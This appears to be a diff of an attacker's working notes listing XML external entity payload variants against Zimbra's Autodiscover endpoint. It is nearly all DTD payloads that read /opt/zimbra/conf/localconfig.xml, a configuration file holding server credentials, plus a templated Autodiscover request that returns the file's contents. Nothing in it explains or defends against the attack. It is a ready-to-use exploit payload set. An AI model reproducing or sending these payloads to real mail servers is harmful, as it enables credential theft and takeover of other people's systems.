@@ -1,2 +1,136 @@
 <!ENTITY % file SYSTEM "file:../conf/localconfig.xml">
 <!ENTITY contData '<![CDATA[%file;]]>'>
+
+
+<!ENTITY fileContents '<![CDATA[%file;]]>'>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# DIFF WAY: BLIND EXPLOITATION
+
+1. Different path`s:
+- <!ENTITY % file SYSTEM "file:../conf/localconfig.xml">
+- "file:///opt/zimbra/conf/localconfig.xml"
+
+2. Different file entity location:
+- in dtd file
+- in req-xml
+
+3. Content constructor:
+- <!ENTITY % mdldt "<![CDA">
+ |<!ENTITY % all "<!ENTITY fileContents '%start;TA[%file;]]>'>">
+- <!ENTITY % all "<!ENTITY fileContents '<![CDATA[%file;]]>'>">
+
+
+
+
+5:========================================================
+DTD:
+<!ENTITY % file SYSTEM "file:../conf/localconfig.xml">
+<!ENTITY % mdldt "<![CDA">
+<!ENTITY % all "<!ENTITY fileContents '%mdldt;TA[%file;]]>'>">
+%all;
+
+6:========================================================
+DTD:
+<!ENTITY % file SYSTEM "file:///opt/zimbra/conf/localconfig.xml">
+<!ENTITY % mdldt "<![CDA">
+<!ENTITY % all "<!ENTITY fileContents '%mdldt;TA[%file;]]>'>">
+%all;
+
+7:========================================================
+DTD:
+<!ENTITY % file SYSTEM "file:../conf/localconfig.xml">
+<!ENTITY % all "<!ENTITY fileContents '<![CDATA[%file;]]>'>">
+%all;
+
+8:========================================================
+DTD:
+<!ENTITY % file SYSTEM "file:///opt/zimbra/conf/localconfig.xml">
+<!ENTITY % all "<!ENTITY fileContents '<![CDATA[%file;]]>'>">
+%all;
+
+
+
+
+1:========================================================
+DTD:
+<!ENTITY % file SYSTEM "file:../conf/localconfig.xml">
+<!ENTITY % mdldt "<![CDA">
+<!ENTITY % all "<!ENTITY fileContents '%mdldt;TA[%file;]]>'>">
+
+2:========================================================
+DTD:
+<!ENTITY % file SYSTEM "file:///opt/zimbra/conf/localconfig.xml">
+<!ENTITY % mdldt "<![CDA">
+<!ENTITY % all "<!ENTITY fileContents '%mdldt;TA[%file;]]>'>">
+
+3:========================================================
+DTD:
+<!ENTITY % file SYSTEM "file:../conf/localconfig.xml">
+<!ENTITY % all "<!ENTITY fileContents '<![CDATA[%file;]]>'>">
+
+4:========================================================
+DTD:
+<!ENTITY % file SYSTEM "file:///opt/zimbra/conf/localconfig.xml">
+<!ENTITY % all "<!ENTITY fileContents '<![CDATA[%file;]]>'>">
+
+<!DOCTYPE Autodisc [
+	<!ELEMENT Autodisc ANY>
+	<!ENTITY % exdt SYSTEM 'file://{externalpath}'>
+	%exdt;
+	%all;
+]>
+<Autodiscover><Request><EMailAddress>{gen_mail()}</EMailAddress><AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema></Request></Autodiscover>
+************************************************************************************************
+************************************************************************************************
+************************************************************************************************
+
+9:========================================================
+DTD:
+<!ENTITY fileContents SYSTEM "file:../conf/localconfig.xml">
+
+10:=======================================================
+DTD:
+<!ENTITY fileContents SYSTEM "file:///opt/zimbra/conf/localconfig.xml">
+
+1:========================================================
+DTD:
+<!ENTITY % file SYSTEM "file:../conf/localconfig.xml">
+<!ENTITY % mdldt "<![CDA">
+<!ENTITY fileContents '%mdldt;TA[%file;]]>'>
+
+2:========================================================
+DTD:
+<!ENTITY % file SYSTEM "file:///opt/zimbra/conf/localconfig.xml">
+<!ENTITY % mdldt "<![CDA">
+<!ENTITY fileContents '%mdldt;TA[%file;]]>'>
+
+3:========================================================
+DTD:
+<!ENTITY % file SYSTEM "file:../conf/localconfig.xml">
+<!ENTITY fileContents '<![CDATA[%file;]]>'>
+
+4:========================================================
+DTD:
+<!ENTITY % file SYSTEM "file:///opt/zimbra/conf/localconfig.xml">
+<!ENTITY fileContents '<![CDATA[%file;]]>'>
+
+
+<!DOCTYPE Autodisc [
+	<!ELEMENT Autodisc ANY>
+	<!ENTITY % exdt SYSTEM 'file://{externalpath}'>
+	%exdt;
+]>
+<Autodiscover><Request><EMailAddress>{gen_mail()}</EMailAddress><AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema></Request></Autodiscover>
